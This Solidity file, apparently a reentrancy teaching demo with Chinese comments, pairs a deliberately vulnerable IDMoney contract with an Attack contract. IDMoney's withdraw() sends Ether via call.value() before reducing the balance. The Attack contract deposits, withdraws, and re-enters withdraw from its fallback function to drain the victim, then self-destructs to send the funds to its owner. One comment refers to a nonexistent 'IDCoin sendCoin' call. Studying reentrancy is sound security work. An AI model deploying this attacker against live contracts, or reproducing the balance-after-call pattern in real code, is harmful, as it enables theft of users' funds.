pragma solidity ^0.4.10;

contract IDMoney {
    address owner;
    mapping (address => uint256) balances;  // 紀錄資產

    event withdrawLog(address, uint256);

    function IDMoney() { owner = msg.sender; }
    function deposit() payable { balances[msg.sender] += msg.value; }
    function withdraw(address to, uint256 amount) {
        require(balances[msg.sender] > amount);
        require(this.balance > amount);

        withdrawLog(to, amount);  // 印log，以便觀察 reentrancy

        to.call.value(amount)();  // 用 call.value()() 來轉帳時，把所有的 Gas 给外部
        balances[msg.sender] -= amount;
    }
    function balanceOf() returns (uint256) { return balances[msg.sender]; }
    function balanceOf(address addr) returns (uint256) { return balances[addr]; }
}
contract Attack {
    address owner;
    address victim;

    modifier ownerOnly { require(owner == msg.sender); _; }

    function Attack() payable { owner = msg.sender; }

    // 設已部署的 IDMoney 合约地址
    function setVictim(address target) ownerOnly { victim = target; }

    // deposit Ether to IDMoney deployed
    function step1(uint256 amount) ownerOnly payable {
        if (this.balance > amount) {
            victim.call.value(amount)(bytes4(keccak256("deposit()")));
        }
    }
    // withdraw Ether from IDMoney deployed
    function step2(uint256 amount) ownerOnly {
        victim.call(bytes4(keccak256("withdraw(address,uint256)")), this, amount);
    }
    // selfdestruct, send all balance to owner
    function stopAttack() ownerOnly {
        selfdestruct(owner);
    }

    function startAttack(uint256 amount) ownerOnly {
        step1(amount);
        step2(amount / 2);
    }

    function () payable {
        if (msg.sender == victim) {
            // 再次試著調用 IDCoin 的 sendCoin 函数，遞迴轉帳
            victim.call(bytes4(keccak256("withdraw(address,uint256)")), this, msg.value);
        }
    }
}
